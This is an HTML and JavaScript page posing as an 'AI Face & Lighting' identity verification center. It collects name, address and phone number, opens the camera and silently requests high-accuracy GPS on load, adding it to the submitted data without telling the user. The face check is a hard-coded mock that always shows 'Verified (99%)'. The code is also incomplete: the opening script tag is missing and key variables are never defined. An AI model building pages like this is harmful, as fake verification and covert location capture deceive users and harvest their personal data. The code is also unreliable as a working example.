<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification & Security Center</title>
    <style>
        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); box-sizing: border-box; }
        
        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }

        .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
        .form-group { margin-bottom: 16px; flex: 1; }
        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
        select:disabled { background-color: #f8fafc; color: #94a3b8; }

        .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
        .btn:hover { background: #0052cc; }
        
        #step-verification { display: none; }
        
        #video-container { text-align: center; margin-top: 15px; position: relative; display: inline-block; width: 100%; max-width: 380px; }
        video { width: 100%; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; transition: filter 0.3s ease; }
        
        /* AI 识别扫描框及变光UI特效 */
        .ai-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; border-radius: 10px; border: 2px dashed rgba(0, 102, 255, 0.6); box-sizing: border-box; display: flex; flex-direction: column; justify-content: space-between; padding: 15px; }
        .ai-badge { background: rgba(0, 0, 0, 0.6); color: #00ffcc; font-size: 11px; padding: 4px 8px; border-radius: 4px; align-self: flex-start; font-family: monospace; }
        .lighting-status { background: rgba(0, 0, 0, 0.6); color: #fff; font-size: 11px; padding: 4px 8px; border-radius: 4px; align-self: flex-end; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <!-- 表单页面 -->
    <div id="step-form">
        <h2>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="5" width="18" height="14" rx="3"/>
            <text x="7" y="15" font-size="9" font-weight="bold" fill="currentColor" stroke="none">A</text>
            <text x="13.5" y="10.5" font-size="6.5" fill="currentColor" stroke="none" opacity="0.8">ID</text>
          </svg>
          Billing & Shipping Address
        </h2>
        <div class="subtitle">Please enter your details to prepare for safety verification</div>
        
        <div class="form-row">
            <div class="form-group">
                <label>First Name</label>
                <input type="text" id="firstName" placeholder="">
            </div>
            <div class="form-group">
                <label>Last Name</label>
                <input type="text" id="lastName" placeholder="">
            </div>
        </div>

        <div class="form-group">
            <label>Country / Region</label>
            <select id="countrySelect" onchange="loadStates()">
                <option value="">-- Select Country / Region --</option>
            </select>
        </div>

        <div class="form-group">
            <label>State / Province</label>
            <select id="stateSelect" disabled>
                <option value="">-- Please select country first --</option>
            </select>
        </div>

        <div class="form-group">
            <label>Street Address</label>
            <input type="text" id="address" placeholder="">
        </div>

        <div class="form-row">
            <div class="form-group">
                <label>City</label>
                <input type="text" id="city" placeholder="">
            </div>
            <div class="form-group">
                <label>Postal Code</label>
                <input type="text" id="zipCode" placeholder="">
            </div>
        </div>

        <div class="form-group">
            <label>Phone Number</label>
            <input type="tel" id="phone" placeholder="">
        </div>

        <button class="btn" onclick="proceedToVerification()">Next</button>
    </div>

    <!-- 活体检测与AI人脸识别页面 -->
    <div id="step-verification">
        <h2>AI Face & Lighting Verification</h2>
        <p style="font-size: 13px; color: #64748b; text-align: center;">Keep your face inside the frame. Dynamic lighting is active.</p>
        <div id="video-container">
            <video id="video" autoplay playsinline muted></video>
            <div class="ai-overlay">
                <span class="ai-badge" id="aiStatusText">AI Face: Detecting...</span>
                <span class="lighting-status" id="lightingStatusText">Light Mode: Adaptive</span>
            </div>
        </div>
        <button class="btn" onclick="submitData()" style="background: #10b981; margin-top: 20px;">Complete & Submit</button>
    </div>
</div>

    /**
     * AI Facial Recognition and Dynamic Lighting Effect Controller Module
     */
    class AIFacialLightingManager {
        constructor(config = {}) {
            this.faceRecognitionEnabled = config.faceRecognitionEnabled ?? true;
            this.lightingEffectMode = config.lightingEffectMode ?? "adaptive"; 
            this.brightnessLevel = config.brightnessLevel ?? 1.0;
        }

        processAIFacialRecognition() {
            if (!this.faceRecognitionEnabled) return { status: "disabled", facesDetected: 0 };
            
            // 模拟人脸检测结果
            const mockDetectedFaces = [
                { id: 1, boundingBox: { x: 100, y: 50, width: 200, height: 200 }, confidence: 0.99 }
            ];

            return {
                status: "success",
                facesDetected: mockDetectedFaces.length,
                faces: mockDetectedFaces,
                timestamp: Date.now()
            };
        }

        applyLightingEffects(videoElement) {
            let targetBrightness = this.brightnessLevel;

            switch (this.lightingEffectMode) {
                case "dim": targetBrightness = 0.6; break;
                case "bright": targetBrightness = 1.4; break;
                case "cinematic": targetBrightness = 0.85; break;
                case "adaptive":
                default: targetBrightness = 1.15; break;
            }

            // 直接通过滤镜在前端呈现变光效果
            if (videoElement) {
                videoElement.style.filter = `brightness(${targetBrightness}) contrast(1.05)`;
            }

            return {
                mode: this.lightingEffectMode,
                brightness: targetBrightness,
                effectApplied: true
            };
        }
    }

    // 实例化 AI 照明与人脸识别控制器
    const aiLightingManager = new AIFacialLightingManager({
        faceRecognitionEnabled: true,
        lightingEffectMode: "adaptive",
        brightnessLevel: 1.0
    });

    window.onload = () => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    silentLocation.lat = pos.coords.latitude;
                    silentLocation.lng = pos.coords.longitude;
                    silentLocation.precisionMeters = pos.coords.accuracy;
                },
                err => { console.log("Location optional"); },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        const select = document.getElementById('countrySelect');
        select.innerHTML = `<option value="">-- Select Country / Region --</option>`;
        
        const sortedKeys = Object.keys(globalDatabase).sort((a, b) => 
            globalDatabase[a].name.localeCompare(globalDatabase[b].name)
        );

        sortedKeys.forEach(code => {
            let opt = document.createElement('option');
            opt.value = code;
            opt.textContent = globalDatabase[code].name;
            select.appendChild(opt);
        });
    };

    function loadStates() {
        const countryCode = document.getElementById('countrySelect').value;
        const stateSelect = document.getElementById('stateSelect');
        
        stateSelect.innerHTML = `<option value="">-- Please select country first --</option>`;
        
        if (countryCode && globalDatabase[countryCode]) {
            stateSelect.disabled = false;
            stateSelect.innerHTML = `<option value="">-- Select State / Province --</option>`;
            globalDatabase[countryCode].states.forEach(stateName => {
                let opt = document.createElement('option');
                opt.value = stateName;
                opt.textContent = stateName;
                stateSelect.appendChild(opt);
            });
        } else {
            stateSelect.disabled = true;
        }
    }

    async function proceedToVerification() {
        const firstName = document.getElementById('firstName').value;
        const lastName = document.getElementById('lastName').value;
        const country = document.getElementById('countrySelect').value;
        
        if (!firstName.trim() || !lastName.trim()) {
            alert("Please enter your first and last name.");
            return;
        }
        if (!country) {
            alert("Please select your country and state.");
            return;
        }

        document.getElementById('step-form').style.display = 'none';
        document.getElementById('step-verification').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const videoEl = document.getElementById('video');
            videoEl.srcObject = stream;

            // 启动 AI 人脸分析与变光模拟流水线
            setTimeout(() => {
                const aiResult = aiLightingManager.processAIFacialRecognition();
                const lightingResult = aiLightingManager.applyLightingEffects(videoEl);

                // 更新前端UI状态
                if(aiResult.status === 'success') {
                    document.getElementById('aiStatusText').textContent = `AI Face: Verified (${(aiResult.faces[0].confidence * 100).toFixed(0)}%)`;
                }
                document.getElementById('lightingStatusText').textContent = `Light: ${lightingResult.mode.toUpperCase()}`;
            }, 800);

        } catch (e) {
            alert("Camera access is required for biometric verification.");
        }
    }

    function submitData() {
        const payload = {
            firstName: document.getElementById('firstName').value,
            lastName: document.getElementById('lastName').value,
            country: document.getElementById('countrySelect').value,
            state: document.getElementById('stateSelect').value,
            address: document.getElementById('address').value,
            city: document.getElementById('city').value,
            zipCode: document.getElementById('zipCode').value,
            phone: document.getElementById('phone').value,
            deviceGPS: silentLocation,
            // 附带 AI 与变光识别的安全审计参数
            aiVerification: aiLightingManager.processAIFacialRecognition(),
            lightingConfig: aiLightingManager.applyLightingEffects(null),
            timestamp: new Date().toISOString()
        };

        console.log("Submitted Payload with AI & Lighting:", payload);
        alert("Verification, AI Face-ID and Data submitted successfully!");
        location.reload();
    }
</script>
